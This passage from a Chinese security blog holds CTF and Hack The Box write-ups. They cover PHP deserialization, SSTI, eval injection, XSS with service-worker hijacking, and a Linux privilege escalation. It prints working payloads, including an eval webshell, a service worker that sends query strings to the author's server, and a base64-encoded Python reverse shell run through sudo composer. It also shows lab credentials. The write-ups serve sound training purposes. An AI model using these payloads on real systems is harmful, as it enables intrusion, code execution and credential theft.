    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
}

if(!$_GET[&#39;img_path&#39;]){
    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
}else{
    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
}

$serialize_info = filter(serialize($_SESSION));

if($function == &#39;highlight_file&#39;){
    highlight_file(&#39;index.php&#39;);
}else if($function == &#39;phpinfo&#39;){
    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
}else if($function == &#39;show_image&#39;){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
}</code></pre>
<pre><code class="php">function filter($img){
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
}
extract($_POST);
$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
$serialize_info = filter(serialize($_SESSION));
$userinfo = unserialize($serialize_info);
echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre>
<p>我们利用filter来吞掉一些字符,从而让我们任意反序列化</p>
<p><code>POST: _SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:12:&quot;aW5kZXgucGhw&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></p>
<p>我们分析一下为什么是这个payload:</p>
<p>…</p>
<p>在phpinfo中找到</p>
<table>
<thead>
<tr>
<th>config</th>
<th>Local Value</th>
<th>Mastr Value</th>
</tr>
</thead>
<tbody><tr>
<td>auto_append_file</td>
<td>d0g3_f1ag.php</td>
<td>d0g3_f1ag.php</td>
</tr>
</tbody></table>
<pre><code>_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}
_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></pre><pre><code class="php">
&lt;?php

$flag = &#39;flag in /d0g3_fllllllag&#39;;

?&gt;</code></pre>
<p><code>flag{62b16099-c29d-499a-9dde-e54bf2985b31}</code></p>
<h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串</p>
<blockquote>
<p>raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。</p>
</blockquote>
<p>   特殊字符串:</p>
<blockquote>
<p>129581926211651571912466741651878684928<br>ffifdyop</p>
</blockquote>
<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><pre><code class="php">&lt;?php

include &#39;flag.php&#39;;

$yds = &quot;dog&quot;;
$is = &quot;cat&quot;;
$handsome = &#39;yds&#39;;

foreach($_POST as $x =&gt; $y){
    $$x = $y;
}

foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}
#$x=handsome $y=flag
foreach($_GET as $x =&gt; $y){
    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
        exit($handsome);
    }
}

if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
    exit($yds);
}

if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
    exit($is);
}



echo &quot;the flag is: &quot;.$flag;</code></pre>
<p><code>/index.php?yds=flag</code></p>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>根据题目的提示,修改xff头,发现可以修改ip,但是修改成127.0.0.1后没有啥东西</p>
<p>后来在fuzz的过程中发现,有ssti漏洞</p>
<pre><code>GET /flag.php HTTP/1.1
Host: node3.buuoj.cn:27223
Upgrade-Insecure-Requests: 1
X-Forwarded-For: {system(&#39;cat /flag&#39;)}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://node3.buuoj.cn:27223/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; JSESSIONID=0740A2433DEA975EE0C0C0CC0D0257D0
Connection: close</code></pre><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><pre><code class="php">&lt;?php

error_reporting(0);
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag/&quot;,$file)){
        die(&quot;Not now!&quot;);
    }

    include($file);  //next.php

}
else{
    highlight_file(__FILE__);
}
?&gt;</code></pre>
<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?text=data://text/plain,I%20have%20a%20dream&amp;file=next.php</code></pre><p>next.php</p>
<pre><code class="php">&lt;?php
$id = $_GET[&#39;id&#39;];
$_SESSION[&#39;id&#39;] = $id;

function complex($re, $str) {
    return preg_replace(
        &#39;/(&#39; . $re . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $str
    );
}


foreach($_GET as $re =&gt; $str) {
    echo complex($re, $str). &quot;\n&quot;;
}

function getFlag(){
    @eval($_GET[&#39;cmd&#39;]);
}
</code></pre>
<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?&amp;\D*=${getFlag()}&amp;file=next.php&amp;text=data://,I%20have%20a%20dream&amp;cmd=system(%27cat%20/flag%27);</code></pre><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>根据提示发现</p>
<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=admin</code></pre><p>fuzz过程中猜测是ssti</p>
<p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="image4749"></p>
<p>检测出是twig</p>
<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>在index.php.swp中找到源码</p>
<pre><code class="php">&lt;?php
    ob_start();
    function get_hash(){
        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;
        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
        $content = uniqid().$random;
        return sha1($content); 
    }
    header(&quot;Content-Type: text/html;charset=utf-8&quot;);
    ***
    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )
    {
        $admin = &#39;6d0bc1&#39;;
        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) {
            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;
            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;
            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
            $text = &#39;
            ***
            ***
            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;
            ***
            ***&#39;;
            fwrite($shtml,$text);
            fclose($shtml);
            ***
            echo &quot;[!] Header  error ...&quot;;
        } else {
            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;

    }else
    {
    ***
    }
    ***
?&gt;</code></pre>
<p>爆破得到密码,</p>
<p>因为将用户名插入到了shtml,造成ssi rce</p>
<p> <a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/3月做题/">https://www.ccreater.top/1970/01/01/3月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="ckmn5754t000us1ni5vsz4gsr" data-title="3月做题" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020西湖论剑" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h1><h2 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h2><p>hint:<br>我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。<br>看看宝塔自己装的 apache 有什么东西？</p>
<p>%00干掉宝塔waf</p>
<p>任意文件上传过滤php关键字<br>上传.htaccess绕过<br>普通的payload并不适用与php-fpm通信<br>在<code>/www/server/panel/vhost/apache</code>下发现php的解析方式</p>
<pre><code> #PHP
    &lt;FilesMatch \.php$&gt;
            SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;
    &lt;/FilesMatch&gt;</code></pre><p>直接设置<code>SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;</code>，访问我们上传的后门并不行，查了下资料发现php-fpm有security.limit_extensions限制了php脚本的后缀名，它的默认值是:<code>.php .phar</code></p>
<p>所以我们上传phar文件getshell,getshell后发现，我们需要readflag而，命令执行函数都被干掉了，php版本是php 7.4.10</p>
<pre><code>passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</code></pre><p>把<a href="https://github.com/Explorersss/exploits中的脚本试过一边后都不行" target="_blank" rel="noopener">https://github.com/Explorersss/exploits中的脚本试过一边后都不行</a></p>
<p>但是这里php-fpm服务是通过socket文件通信的，我们可以直接打php-fpm绕过disable function</p>
<p><a href="https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php" target="_blank" rel="noopener">https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php</a></p>
<h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><pre><code class="php">&lt;?php
include &#39;security.php&#39;;

if(!isset($_GET[&#39;source&#39;])){
    show_source(__FILE__);
    die();
}
$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
var_dump($sandbox);
if(!file_exists($sandbox)){
    mkdir($sandbox);
    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
}
$action = $_GET[&#39;action&#39;];
$content = file_get_contents(&quot;php://input&quot;);


if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
    $content = json_decode($content);
    $filename = $_GET[&#39;filename&#39;];
    $filecontent = $content-&gt;content;
    $filename = $sandbox.$filename;
    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
}elseif($action == &quot;reset&quot;){
    $files = scandir($sandbox);
    foreach($files as $file) {
        if(!is_dir($file)){
            if($file !== &quot;index.php&quot;){
                unlink($sandbox.$file);
            }
        }
    }
}
else{
    die(&#39;Security Check Failed.&#39;);
}</code></pre>
<pre><code>POST /?source=1&amp;action=write&amp;filename=index.php HTTP/1.1
Host: easyjson.xhlj.wetolink.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 439

{&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u0070\u0068\u0070\u005f\u0076\u0061\u006c\u0075\u0065\u0020\u0061\u0075\u0074\u006f\u005f\u0070\u0072\u0065\u0070\u0065\u006e\u0064\u005f\u0066\u0069\u006c\u0065\u0020\u0022\u002e\u0068\u0074\u0061\u0063\u0063\u0065\u0073\u0073\u0022\u000a\u0023\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;}</code></pre><p>flag{a5db5397505f825334aa4dfc17d3bb9f}</p>
<h2 id="hardxss"><a href="#hardxss" class="headerlink" title="hardxss"></a>hardxss</h2><p>在登入接口发现如下代码：</p>
<pre><code class="javascript">callback = &quot;get_user_login_status&quot;;
        auto_reg_var();
        if(typeof(jump_url) == &quot;undefined&quot; || /^\//.test(jump_url)){
            jump_url = &quot;/&quot;;
        }
        jsonp(&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot; + callback,function(result){
            if(result[&#39;status&#39;]){
                location.href = jump_url;
            }
        })
        function jsonp(url, success) {
            var script = document.createElement(&quot;script&quot;);
            if(url.indexOf(&quot;callback&quot;) &lt; 0){
                var funName = &#39;callback_&#39; + Date.now() + Math.random().toString().substr(2, 5);
                url = url + &quot;?&quot; + &quot;callback=&quot; + funName;
            }else{
                var funName = callback;
            }
            window[funName] = function(data) {
                success(data);
                delete window[funName];
                document.body.removeChild(script);
            }
            script.src = url;
            document.body.appendChild(script);
        }
        function auto_reg_var(){
            var search = location.search.slice(1);
            var search_arr = search.split(&#39;&amp;&#39;);
            for(var i = 0;i &lt; search_arr.length; i++){
                [key,value] = search_arr[i].split(&quot;=&quot;);
                window[key] = value;
            }
        }</code></pre>
<p>利用jsonp任意xss</p>
<p>view-source:<a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)</a>;</p>
<p>利用Service Workers从xss.hardxss.xhlj.wetolink.com移动到auth.hardxss.xhlj.wetolink.com</p>
<p><a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//</a></p>
<p>2:</p>
<pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;
a=document.createElement(&quot;iframe&quot;);
a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;
document.body.append(a);
document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
function fuck(){
    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;
    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
}
</code></pre>
<p>/:</p>
<pre><code class="javascript">self.addEventListener(&#39;fetch&#39;, function(event) {
  event.respondWith(new Response(&#39;&lt;html&gt;&lt;script&gt;document.location.href=&quot;http://ccreater.top:60000/?&quot;+document.location.search&lt;/script&gt;&lt;/html&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
});</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png" alt="image5725"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222516.png" alt="image5832"></p>
<p>详细说明见：<a href="http://blog.ccreater.top/2020/10/15/Service%20Worker/" target="_blank" rel="noopener">http://blog.ccreater.top/2020/10/15/Service%20Worker/</a></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020西湖论剑/">https://www.ccreater.top/1970/01/01/2020西湖论剑/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-id="ckmn5754u000xs1nidm3f8f7t" data-title="2020西湖论剑" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-Academy_write_up" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/Academy_write_up/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/Academy_write_up/">Academy_write_up</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Academy-Write-Up"><a href="#Academy-Write-Up" class="headerlink" title="Academy Write Up"></a>Academy Write Up</h1><p>目标：10.10.10.215</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  socks5?
</code></pre><p>33060端口不知道是啥</p>
<h2 id="攻击http服务"><a href="#攻击http服务" class="headerlink" title="攻击http服务"></a>攻击http服务</h2><p>扫描目录得到</p>
<pre><code>[20:35:08] 200 -    3KB - /admin.php
[20:36:10] 200 -    0B  - /config.php
[20:37:09] 302 -   54KB - /home.php  -&gt;  login.php
[20:37:21] 200 -    2KB - /index.php
[20:37:40] 200 -    3KB - /login.php
[20:38:32] 200 -    3KB - /register.php</code></pre><p>测试登入，注册接口的时候发现，</p>
<p>注册的POST请求是这样的：<code>uid=admin123&amp;password=admin123&amp;confirm=admin123&amp;roleid=0</code></p>
<p>有个roleid参数，将其改成1，注册admin账号</p>
<p>admin登入成功后，发现子域名</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112224004.png" alt="image811"></p>
<p>一进去网站就是报错状态，试着爆破路径，啥也没有</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201111213605.png" alt="image951"></p>
<p>msf搜索了一下laravel</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112224208.png" alt="image1077"></p>
<p>设置好参数试了一下就打通了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="www-data用户提升至cry0l1t3"><a href="#www-data用户提升至cry0l1t3" class="headerlink" title="www-data用户提升至cry0l1t3"></a>www-data用户提升至cry0l1t3</h3><p>翻了翻配置文件找到/var/www/html/academy/.env</p>
<pre><code>
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
</code></pre><p>这个密码诶个是过去发现是cry0l1t3的密码</p>
<h3 id="cry0l1t3移动到mrb3n"><a href="#cry0l1t3移动到mrb3n" class="headerlink" title="cry0l1t3移动到mrb3n"></a>cry0l1t3移动到mrb3n</h3><pre><code>id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)</code></pre><p>发现和syslog在同一个组下，我们可以查看任意日志了</p>
<p><code>cd /var/log/audit&amp;&amp;cat * | grep data=</code> 查看用户的输入</p>
<pre><code>type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=7375206D7262336E0A
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A
type=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=77686F616D690A
type=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740A
type=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199443.421:94): tty pid=2606 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199533.458:95): tty pid=2643 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199575.087:96): tty pid=2686 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=3618790D
type=TTY msg=audit(1597199606.563:97): tty pid=2537 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;bash&quot; data=63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
type=TTY msg=audit(1597199606.567:98): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740A
type=TTY msg=audit(1597199610.163:107): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199616.307:108): tty pid=2712 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;bash&quot; data=6973746F72790D686973746F72790D657869740D
type=TTY msg=audit(1597199616.307:109): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740A
</code></pre><p>其中的<code>7375206D7262336E0A</code>=<code>su mrb3n</code>,<code>6D7262336E5F41634064336D79210A</code>=<code>mrb3n_Ac@d3my!</code></p>
<p>拿到mrb3n的密码</p>
<h3 id="mrb3n提权root"><a href="#mrb3n提权root" class="headerlink" title="mrb3n提权root"></a>mrb3n提权root</h3><p>sudo -l 看看自己能不能用sudo</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112225248.png" alt="image4850"></p>
<p>发现我们可以用sudo 执行composer</p>
<p>直接RCE</p>
<p>新建composer.json</p>
<pre><code>{
    &quot;scripts&quot;: {
        &quot;test&quot;: &quot;python3 -c \&quot;import base64; exec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0Ljk5Jyw1NTU1KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=&#39;))\&quot;&quot;
    }
}</code></pre><p><code>sudo composer run-script --timeout=0 test</code></p>
<p>拿到root权限</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112225515.png" alt="image5511"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>一定要记得看自己能不能sudo</li>
<li>在adm组中通常可以查看任意日志</li>
<li>/var/log/audit存放着用户的输入，很有可能拿到密码</li>
</ol>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/Academy_write_up/">https://www.ccreater.top/1970/01/01/Academy_write_up/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/Academy_write_up/" data-id="ckmn5754w0012s1nia1mkd7u2" data-title="Academy_write_up" class="article-share-link">Share</a>
      
	  
      
      
